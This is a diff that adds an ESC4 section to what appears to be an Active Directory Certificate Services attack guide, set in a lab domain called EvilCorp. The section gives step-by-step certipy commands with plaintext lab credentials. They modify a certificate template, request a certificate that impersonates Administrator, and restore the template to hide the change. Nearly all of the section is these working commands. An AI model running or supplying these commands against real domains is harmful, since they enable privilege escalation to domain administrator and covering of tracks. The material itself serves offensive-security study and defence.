@@ -195,6 +195,25 @@ certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCo
 <br></br>
 <h3 align="center" id="heading">ESC4: Vulnerable Certificate Template Access Control:</h3>
 
+
+![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/ESC4.png?raw=true)
+
+How to abuse:
+
+First of all, it is important to save the configuration of the template we are going to modify:
+```
+certipy template 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -template 'Vulnerable ESC4' -save-old
+```
+The certificate template is now vulnerable to the ESC1 technique.
+Therefore, we can now request a certificate based on the ESC4 template and specify a SAN:
+```
+certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC4' -alt 'Administrator@EvilCorp.local'
+```
+Now, we can restore the old configuration:
+```
+certipy template 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -template 'Vulnerable ESC4' -configuration 'Vulnerable ESC4.json'
+```
+
 <a name="ECS5"></a>
 <br></br>
 <h3 align="center" id="heading">ESC5: Vulnerable PKI Object Access Control:</h3>
